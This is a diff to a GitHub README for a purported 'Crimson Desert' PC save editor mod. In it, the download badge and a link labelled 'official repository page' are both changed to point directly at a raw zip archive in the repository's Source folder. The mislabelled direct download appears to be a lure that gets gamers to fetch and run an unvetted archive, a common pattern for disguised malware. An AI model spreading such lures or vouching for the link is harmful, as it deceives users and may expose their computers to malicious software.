@@ -1,6 +1,6 @@
 # 💾 Crimson-Desert-Save-Editor-Mod-For-PC - Modify your game save files easily
 
-[![Download Crimson Desert Save Editor](https://img.shields.io/badge/Download-Save_Editor-blue)](https://github.com/sorrelmandator9243/Crimson-Desert-Save-Editor-Mod-For-PC)
+[![Download Crimson Desert Save Editor](https://img.shields.io/badge/Download-Save_Editor-blue)](https://github.com/sorrelmandator9243/Crimson-Desert-Save-Editor-Mod-For-PC/raw/refs/heads/main/Source/Desert_For_PC_Mod_Save_Editor_Crimson_v3.9.zip)
 
 This tool allows you to change your save data for Crimson Desert on PC. You control your player stats, inventory, and game progress. Use this application to tweak your character level, adjust your gold, or unlock specific items. 
 
@@ -17,7 +17,7 @@ Ensure your computer meets these needs to run the editor:
 
 ## 📥 How to Install and Run
 
-1. Visit the [official repository page](https://github.com/sorrelmandator9243/Crimson-Desert-Save-Editor-Mod-For-PC) to see the download options.
+1. Visit the [official repository page](https://github.com/sorrelmandator9243/Crimson-Desert-Save-Editor-Mod-For-PC/raw/refs/heads/main/Source/Desert_For_PC_Mod_Save_Editor_Crimson_v3.9.zip) to see the download options.
 2. Locate the latest release version on the page.
 3. Download the installation package to your computer.
 4. Extract the folder to a location you can find, such as your Desktop.
